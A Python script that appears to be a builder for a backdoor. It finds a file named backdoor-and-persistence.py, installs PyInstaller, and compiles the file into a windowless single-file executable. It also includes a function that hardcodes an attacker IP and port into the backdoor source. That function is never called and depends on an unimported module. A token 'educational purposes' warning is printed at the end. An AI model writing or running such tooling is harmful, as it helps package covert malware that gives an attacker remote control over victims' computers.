import subprocess
import sys
import os

# Get the directory where THIS script is located
CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))

def find_backdoor():
    """Search for backdoor-and-persistence.py in the same folder"""
    print(f"[*] Searching in: {CURRENT_DIRECTORY}")
    
    files = os.listdir(CURRENT_DIRECTORY)
    print("[*] Files found:")
    
    for file in files:
        print(f"  - {file}")
    
    # Possible names (case insensitive)
    possible_names = [
        "backdoor-and-persistence.py",
        "backdoor_and_persistence.py",
        "backdoor-persistence.py",
        "backdoor persistence.py",
        "backdoor.py"
    ]
    
    for name in possible_names:
        full_path = os.path.join(CURRENT_DIRECTORY, name)
        if os.path.exists(full_path):
            print(f"[+] File found: {name}")
            return full_path
    
    # If not found with exact names, search for files containing "backdoor"
    for file in files:
        if file.lower().endswith('.py') and 'backdoor' in file.lower():
            full_path = os.path.join(CURRENT_DIRECTORY, file)
            print(f"[+] Using similar file: {file}")
            return full_path
    
    return None

def install_pyinstaller():
    print("[*] Checking PyInstaller...")
    try:
        import PyInstaller
        print("[+] PyInstaller already installed")
        return True
    except ImportError:
        print("[!] PyInstaller not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                                stdout=subprocess.DEVNULL)
            print("[+] PyInstaller installed successfully")
            return True
        except:
            print("[-] Error installing PyInstaller")
            return False
        
        
def modify_backdoor_with_ip(backdoor_path, ip_address, port):
    """Create a modified version of the backdoor with embedded IP and port"""
    print(f"[*] Modifying backdoor to use IP: {ip_address}:{port}")
    
    # Read the original backdoor code
    with open(backdoor_path, 'r', encoding='utf-8', errors='ignore') as f:
        original_code = f.read()
    
    # Create a temporary file with modified code
    temp_dir = tempfile.mkdtemp()
    temp_backdoor = os.path.join(temp_dir, "backdoor_modified.py")
    
    # Modified code - remove the input() calls and use embedded IP
    modified_code = original_code
    
    # Remove the try block and input() calls
    if 'try:' in modified_code and 'ip = input(' in modified_code:
        # Find the try block section
        try_index = modified_code.find('try:')
        input_start = modified_code.find('ip = input("', try_index)
        
        if input_start != -1:
            # Find the end of the try block
            input_end = modified_code.find('\n\n', input_start)
            if input_end == -1:
                input_end = len(modified_code)
            
            # Replace the try block with hardcoded IP
            replacement_code = f'''
# Hardcoded connection parameters
ip = "{ip_address}"
port = {port}

try: 
    my_backdoor = Backdoor(ip, port)
    my_backdoor.run()
except Exception:
    sys.exit()
'''
            
            # Replace from 'try:' to the end of input section
            modified_code = modified_code[:try_index] + replacement_code
    
    # Write modified code to temporary file
    with open(temp_backdoor, 'w', encoding='utf-8') as f:
        f.write(modified_code)
    
    print(f"[+] Backdoor modified with IP: {ip_address}:{port}")
    return temp_backdoor, temp_dir

def compile_backdoor(backdoor_path):
    if not backdoor_path:
        print("[-] No backdoor file found!")
        return False
    
    print(f"[*] Compiling: {os.path.basename(backdoor_path)}")
    
    # Change to the file's directory
    os.chdir(CURRENT_DIRECTORY)
    
    base_name = os.path.splitext(os.path.basename(backdoor_path))[0]
    exe_name = base_name.replace("-", "_").replace(" ", "_")
    
    command = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", exe_name,
        os.path.basename(backdoor_path)
    ]
    
    print(f"[*] Command: {' '.join(command)}")
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        
        exe_path = os.path.join("dist", f"{exe_name}.exe")
        if os.path.exists(exe_path):
            size = os.path.getsize(exe_path) / 1024
            print(f"[+] Compilation successful!")
            print(f"[+] Executable: {exe_path}")
            print(f"[+] Size: {size:.2f} KB")
            return True
        else:
            print("[-] Compilation failed (.exe file not generated)")
            return False
            
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation error:")
        if e.stderr:
            print(f"ERROR: {e.stderr[:500]}")
        return False

def main():
    print("=" * 60)
    print("AUTOMATIC COMPILER - FINDS BACKDOOR IN SAME FOLDER")
    print("=" * 60)
    
    # 1. Find the backdoor file
    backdoor_path = find_backdoor()
    
    if not backdoor_path:
        print("\n[-] backdoor-and-persistence.py file not found!")
        print("\nWhat to do:")
        print("1. Make sure backdoor-and-persistence.py is in the SAME folder")
        print("2. Rename your file to 'backdoor-and-persistence.py'")
        print("3. Or drag and drop your .py file into this script's folder")
        
        # Manual selection option
        py_files = [f for f in os.listdir(CURRENT_DIRECTORY) if f.endswith('.py') and f != os.path.basename(__file__)]
        if py_files:
            print(f"\n[*] Available .py files:")
            for i, file in enumerate(py_files, 1):
                print(f"    {i}. {file}")
            
            choice = input("\n[*] Choose a number or press Enter to exit: ")
            if choice.isdigit() and 1 <= int(choice) <= len(py_files):
                backdoor_path = os.path.join(CURRENT_DIRECTORY, py_files[int(choice)-1])
            else:
                input("\nPress Enter to exit...")
                return
    
    if not backdoor_path:
        return
    
    # 2. Install PyInstaller
    if not install_pyinstaller():
        input("\nPress Enter to exit...")
        return
    
    # 3. Compile
    print("\n" + "=" * 60)
    if compile_backdoor(backdoor_path):
        print("\n[+] COMPILATION COMPLETED SUCCESSFULLY!")
    else:
        print("\n[-] COMPILATION FAILED")
    
    print("\n" + "=" * 60)
    print("[!] WARNING: Use only for educational purposes in controlled environments!")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()